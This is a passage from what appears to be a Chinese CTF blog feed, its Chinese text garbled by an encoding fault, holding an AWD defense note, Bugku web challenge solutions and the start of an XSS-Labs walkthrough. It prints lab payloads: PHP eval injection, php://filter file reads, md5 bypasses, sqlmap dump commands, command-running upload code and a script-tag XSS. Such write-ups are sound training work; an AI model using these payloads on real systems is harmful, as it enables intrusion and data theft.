è¾“ï¼Œå½“ç„¶ä¸å¯ä»¥ä½œä¸ºrootç”¨æˆ·ä¼ è¾“</p><p>å¦‚æœä½¿ç”¨team32ç”¨æˆ·è¿æ¥åˆ™å¯èƒ½éœ€è¦å…ˆå°†æºç ä¿å­˜åˆ°è¯¥ç”¨æˆ·çš„èµ„æºä¸‹</p><pre><code>cp -r /var/www/html /home/team32/download</code></pre><p>ç„¶ååˆ©ç”¨xftpæ‹–æ‹½å³å¯ä¿å­˜æºç </p><h1 id="AWDé˜²å¾¡é˜¶æ®µ"><a href="#AWDé˜²å¾¡é˜¶æ®µ" class="headerlink" title="AWDé˜²å¾¡é˜¶æ®µ"></a>AWDé˜²å¾¡é˜¶æ®µ</h1><h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š</h2><h3 id="æ‰«ç›²ï¼š"><a href="#æ‰«ç›²ï¼š" class="headerlink" title="æ‰«ç›²ï¼š"></a>æ‰«ç›²ï¼š</h3><p><a href="https://www.runoob.com/linux/linux-comm-find.html" target="_blank" rel="noopener">Linux find å‘½ä»¤</a></p><p><a href="https://www.runoob.com/linux/linux-comm-rm.html" target="_blank" rel="noopener">Linux rm å‘½ä»¤</a></p><h3 id="æ“ä½œï¼š"><a href="#æ“ä½œï¼š" class="headerlink" title="æ“ä½œï¼š"></a>æ“ä½œï¼š</h3><p>1.ä»–å­˜åœ¨äº/admin/upload.phpä¸­ï¼Œvimç¼–è¾‘upload.phpï¼Œåœ¨æœ€åå†™å…¥</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"success"</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.åˆ é™¤uploadæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p><p>3.åˆ©ç”¨å‘½ä»¤ï¼š</p><pre><code>find /var/www/html/ -name &quot;*.php&quot; | xargs grep &quot;eval&quot;;find /var/www/html/ -name &quot;*.php&quot; | xargs grep &quot;system&quot;;</code></pre><p>æ‰¾åˆ°å«æœ‰å±é™©å‡½æ•°çš„phpæ–‡ä»¶ï¼Œè®°ä½åå­—åˆ©ç”¨ï¼š</p><pre><code>rm -rf 1.php 2.php</code></pre><p>åˆ é™¤å·²ç»å­˜åœ¨çš„ä¸€å¥è¯æœ¨é©¬</p><ul><li>-f å³ä½¿åŸæ¡£æ¡ˆå±æ€§è®¾ä¸ºå”¯è¯»ï¼Œäº¦ç›´æ¥åˆ é™¤ï¼Œæ— éœ€é€ä¸€ç¡®è®¤ã€‚</li><li>-r å°†ç›®å½•åŠä»¥ä¸‹ä¹‹æ¡£æ¡ˆäº¦é€ä¸€åˆ é™¤ã€‚</li></ul><h2 id="å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼š"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼š" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼š"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼š</h2><p>åˆ©ç”¨å‘½ä»¤ï¼š</p><pre><code>find /var/www/html/ -name &quot;*.php&quot; | xargs grep &quot;system&quot;;</code></pre><p>æ¥æŸ¥æ‰¾å±é™©å‡½æ•°ï¼Œç„¶åæ ¹æ®æ‰¾åˆ°çš„æ–‡ä»¶</p><h2 id="SQLæ³¨å…¥æ¼æ´ï¼š"><a href="#SQLæ³¨å…¥æ¼æ´ï¼š" class="headerlink" title="SQLæ³¨å…¥æ¼æ´ï¼š"></a>SQLæ³¨å…¥æ¼æ´ï¼š</h2><p>é¦–å…ˆä½ éœ€è¦æ‰¾åˆ°å­˜åœ¨sqlæ³¨å…¥çš„ç‚¹ï¼Œç”±äºä¸€å¼€å§‹çš„æ—¶é—´ä¸å……è¶³ï¼Œå¯ä»¥é‡‡å–å°†é¡µé¢é™æ€åŒ–çš„ç­–ç•¥ï¼Œç›´æ¥ä¿®æ”¹fromåé¢è¡¨çš„åå­—ï¼Œè¿™æ ·å¯¹æ‰‹å°±æ— æ³•å¾—åˆ°ä»»ä½•ä¿¡æ¯ï¼Œåœ¨åç»­å°†å¤§éƒ¨åˆ†æ¼æ´ä¿®è¡¥å®Œæ¯•ä»¥åå†é‡‡å–å¦‚ä¸‹æªæ–½</p><p>é˜²å¾¡ç›‘æ§æ”»å‡»tail -f *.log</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugkuåˆ·é¢˜è®°å½•</title>
      <link href="/2021/04/08/bugku-shua-ti-ji-lu/"/>
      <url>/2021/04/08/bugku-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=569213220&auto=1&height=66"></iframe><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>è¿™æ˜¯å…³äºpyçš„æ–‡ä»¶ä¸Šä¼ </p><p>å›¾ç‰‡é©¬:</p><pre><code>import osos.system(&#39;cat /flag&#39;)</code></pre><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>f12é‡Œé¢</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>å‰ç«¯é™åˆ¶äº†è¾“å…¥çš„ä½æ•°</p><p>ä¿®æ”¹å³å¯</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>é¢˜ç›®ï¼š</p><pre><code>$what=$_GET[&#39;what&#39;];echo $what;if($what==&#39;flag&#39;)echo &#39;flag{****}&#39;;</code></pre><p>payload:</p><pre><code>?what=flag</code></pre><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><pre><code>$what=$_POST[&#39;what&#39;];echo $what;if($what==&#39;flag&#39;)echo &#39;flag{****}&#39;;</code></pre><p>postä¼ å‚</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>hintsï¼šçŸ›ç›¾</p><pre><code>$num=$_GET[&#39;num&#39;];if(!is_numeric($num)){echo $num;if($num==1)echo &#39;flag{**********}&#39;;}</code></pre><p>payloadï¼š</p><pre><code>?num=1e</code></pre><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>f12å¾—åˆ°ï¼š</p><pre><code>&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#49;&amp;#53;&amp;#102;&amp;#52;&amp;#101;&amp;#98;&amp;#48;&amp;#97;&amp;#102;&amp;#97;&amp;#51;&amp;#99;&amp;#101;&amp;#97;&amp;#54;&amp;#101;&amp;#50;&amp;#99;&amp;#51;&amp;#100;&amp;#48;&amp;#52;&amp;#50;&amp;#97;&amp;#50;&amp;#49;&amp;#100;&amp;#56;&amp;#50;&amp;#48;&amp;#52;&amp;#56;&amp;#125;</code></pre><p>Unicodeè½¬asciiå¾—åˆ°flag</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>hintsï¼šä½ å¿…é¡»è®©ä»–åœä¸‹</p><p>æŠ“ä¸€ä¸ªåŒ…å³å¯ï¼Œå‘é€åˆ°repeaterä¸æ–­é‡æ”¾ï¼Œä¸€å¸§ä¸€å¸§çš„åˆ†æ</p><h2 id="ç¤¾å·¥-åˆæ­¥æ”¶é›†"><a href="#ç¤¾å·¥-åˆæ­¥æ”¶é›†" class="headerlink" title="ç¤¾å·¥-åˆæ­¥æ”¶é›†"></a>ç¤¾å·¥-åˆæ­¥æ”¶é›†</h2><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span> <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">eval</span><span class="token punctuation">(</span> <span class="token string">"var_dump($a);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre><code>?hello=);show_source(&#39;flag.php&#39;</code></pre><p><a href="https://www.runoob.com/php/func-misc-show-source.html" target="_blank" rel="noopener">PHP show_source() å‡½æ•°</a></p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><pre class="line-numbers language-php"><code class="language-php">flag In the variable <span class="token operator">!</span> <span class="token delimiter">&lt;?php</span>  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag1.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^\w+$/"</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($$args);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å…¥çš„å‚æ•°ä¸­å¿…é¡»æœ‰å­—æ¯æˆ–è€…æ•°å­—æˆ–è€…_+$</p><p>payloadï¼š</p><pre><code>?args=GLOBALS</code></pre><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>hints:å¤´ç­‰èˆ±</p><p><a href="https://www.cnblogs.com/wangshuazi/p/9809756.html" target="_blank" rel="noopener">headerå¤´ä¸­æœ‰ä¿¡æ¯</a>ï¼šæŠ“åŒ…çœ‹å¤´ä¿¡æ¯å³å¯</p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>hintsï¼šç½‘ç«™è¢«é»‘äº† é»‘å®¢ä¼šä¸ä¼šç•™ä¸‹åé—¨</p><p>åˆ©ç”¨å¾¡å‰‘æ‰«æä¸€ä¸‹åå°å‘ç°shell.phpæ–‡ä»¶ï¼Œæ‰“å¼€ä»¥åå‘ç°æ˜¯hackerç•™ä¸‹çš„æœ¨é©¬ç™»é™†ç¨‹åº¦ï¼Œåˆ©ç”¨burpæŠ“åŒ…è¿›è¡Œä¸€ä¸ªçˆ†ç ´å¾—åˆ°å¯†ç æ˜¯hackï¼Œå³å¯å¾—åˆ°flag</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>hintsï¼šæœ¬åœ°ç®¡ç†å‘˜</p><p>è€ƒæŸ¥<a href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html" target="_blank" rel="noopener">HTTP  X-Forwarded-For</a>ä¸€ä¸ªhttpæ‰©å±•å¤´ä¿¡æ¯</p><p>X-Forwarded-For:127.0.0.1</p><p>è´¦æˆ·adminå¯†ç test123åœ¨æºä»£ç çš„æ³¨é‡Šé‡Œé¢æœ‰base64è§£ç å³å¯</p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>hintï¼šçœ‹çœ‹æºä»£ç ï¼Ÿ</p><p>æºä»£ç ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">var</span> p1 <span class="token operator">=</span> <span class="token string">'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'</span><span class="token punctuation">;</span><span class="token keyword">var</span> p2 <span class="token operator">=</span> <span class="token string">'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token string">'%35%34%61%61%32'</span> <span class="token operator">+</span> p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>urlè§£ç å¾—åˆ°ï¼š</p><pre class="line-numbers language-javascript"><code class="language-javascript">p1<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function">checkSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"undefined"</span><span class="token operator">!=</span><span class="token keyword">typeof</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>"67d709b2bp2<span class="token operator">=</span>aa648cf6e87a7114f1<span class="token string">"==a.value)return!0;alert("</span>Error<span class="token string">");a.focus();return!1}}document.getElementById("</span>levelQuest"<span class="token punctuation">)</span><span class="token punctuation">.</span>onsubmit<span class="token operator">=</span>checkSubmit<span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token string">'54aa2'</span> <span class="token operator">+</span> p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.w3school.com.cn/jsref/jsref_unescape.asp" target="_blank" rel="noopener">JavaScript unescape() å‡½æ•°</a></p><pre class="line-numbers language-javascript"><code class="language-javascript">ç»“åˆï¼š<span class="token keyword">function</span> <span class="token function">checkSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"undefined"</span><span class="token operator">!=</span><span class="token keyword">typeof</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"67d709b2b54aa2aa648cf6e87a7114f1"</span><span class="token operator">==</span>a<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token operator">!</span><span class="token number">1</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"levelQuest"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>onsubmit<span class="token operator">=</span>checkSubmit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°†å¾—åˆ°çš„67d709b2b54aa2aa648cf6e87a7114f1æäº¤</p><p>å¾—åˆ°flag</p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>æ–‡ä»¶åŒ…å«å¸¸ç”¨æ¼æ´ï¼Œ</p><pre><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>hints:   å¥½åƒéœ€è¦å¯†ç </p><p>çˆ†ç ´äº”ä½æ•°å¯†ç ï¼š12468</p><p>å¾—åˆ°flag</p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>hintï¼šå¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</p><p>å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼šd41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e</p><p>md5è§£å¯†ï¼š[ç©ºå¯†ç ]</p><p>ç›´æ¥ä¸Šæˆ‘çš„å¤‡ä»½å°å­—å…¸ï¼Œç»“åˆburpå®ç°åŠè‡ªåŠ¨åŒ–çˆ†ç ´çš„å¾—åˆ°æ–‡ä»¶ï¼šindex.php.bak</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key1</span> <span class="token operator">!==</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token string">"å–å¾—flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€ƒç‚¹md5ç¢°æ’ï¼š?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</p><p>æˆ–è€…md5()å‡½æ•°ä¸å¤„ç†æ•°ç»„ï¼š?kekeyy1[]=[1]&amp;kekeyy2[]=[2]</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><p>ç›´æ¥æ‰‹å·¥æ³¨å…¥ï¼ï¼ï¼ï¼ï¼ï¼ï¼ç»“æœè€æ˜¯å¤±è´¥</p><p>åªèƒ½SQLmapäº†ï¼Œå»ºè®®å…ˆburpæŠ“åŒ…ç”¨-r a.txtæ¥å®ç°sqlmap</p><p>æˆ–è€…ï¼š</p><pre><code>sqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; --dbssqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf --tablessqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf -T fl4g --columnssqlmap -u http://114.67.246.176:15828/  --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump</code></pre><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://114.67.246.176:17079/'</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>source <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>expression <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'(\d+[+\-*])+(\d+)'</span><span class="token punctuation">,</span>source<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> eval<span class="token punctuation">(</span>expression<span class="token punctuation">)</span>post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span>result<span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>post<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> re <span class="token comment" spellcheck="true">#æ­£åˆ™åŒ¹é…æ¨¡å—</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#å»ºç«‹ä¼šè¯</span>url <span class="token operator">=</span> <span class="token string">"http://123.206.87.240:8002/web6/"</span>head <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>headers <span class="token comment" spellcheck="true">#è·å–å¤´éƒ¨ä¿¡æ¯</span>result <span class="token operator">=</span> head<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#å¾—åˆ°flagçš„value</span>result <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#ç¬¬ä¸€æ¬¡base64è§£ç </span>result <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'\w+$'</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#æ­£åˆ™åŒ¹é…base64ç¼–ç çš„flag</span>result <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#ç¬¬äºŒæ¬¡è§£ç </span>payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'margin'</span><span class="token punctuation">:</span> result<span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#postä¼ è¾“æ•°æ®ä¸”è¾“å‡ºè¿”å›ä¿¡æ¯</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-Labsé€šå…³è®°å½•</title>
      <link href="/2021/03/31/xss-labs-tong-guan-ji-lu/"/>
      <url>/2021/03/31/xss-labs-tong-guan-ji-lu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1325484613&auto=1&height=66"></iframe><p>å‰è¨€ï¼šåªæœ‰ç†è§£äº†æºç ï¼Œæ‰èƒ½æ‘¸åˆ°ç²¾é«“</p><h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><p>ç›´æ¥ä¸€æŠŠ</p><pre><code>http://127.0.0.1/xss-labs-master/level1.php?name=&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></pre><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210331090452600.png" alt></p><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>æ­¤å‡½æ•°æ˜¯å°†ä¼ å…¥çš„å‚æ•°ç»™åˆ°äº†è¿™é‡Œé¢ï¼š</p><pre><code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code></pre><p>æ„é€ payloadï¼š</p><pre><code>&lt;input name=keyword  